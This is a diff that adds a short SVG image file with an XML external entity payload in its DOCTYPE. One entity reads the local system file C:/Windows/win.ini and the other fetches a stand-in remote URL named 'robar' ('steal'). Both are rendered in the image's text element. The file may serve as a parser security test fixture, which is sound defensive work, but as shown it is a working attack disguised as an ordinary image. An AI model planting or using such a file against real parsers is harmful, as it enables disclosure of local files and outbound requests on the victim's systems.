@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+	<!ENTITY secreto SYSTEM "file:///C:/Windows/win.ini">
+	<!ENTITY remoto SYSTEM "http://example.invalid/robar">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 60">
+	<rect x="0" y="0" width="40" height="30"/>
+	<text x="10" y="15">&secreto;&remoto;</text>
+</svg>
